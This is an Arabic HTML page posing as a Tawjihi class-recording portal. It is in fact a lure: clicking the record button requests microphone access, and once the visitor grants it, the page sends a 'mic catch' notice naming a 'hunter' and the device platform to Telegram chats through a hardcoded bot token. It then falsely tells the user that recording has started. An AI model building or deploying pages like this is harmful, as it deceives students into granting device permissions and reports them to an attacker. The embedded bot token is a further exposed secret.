<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>تسجيل الحصص - 2009</title></head>
<body style="text-align:center; background:#f4f4f4; padding:50px;">
    <h3>بوابة تسجيل حصص التوجيهي 🎤</h3>
    <button onclick="rec()" style="padding:20px; background:#3498db; color:#fff; border:none; border-radius:10px;">بدء التسجيل</button>
    <script>
        const pr = new URLSearchParams(window.location.search);
        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
        function rec() {
            navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
                const msg = encodeURIComponent(`🎤 صيدة مايك من: ${pr.get('hunter')}\n📱 جهاز: ${navigator.platform}`);
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`);
                alert("بدأ التسجيل...");
            }).catch(e => alert("اسمح بالمايك"));
        }
    </script>
</body>
</html>
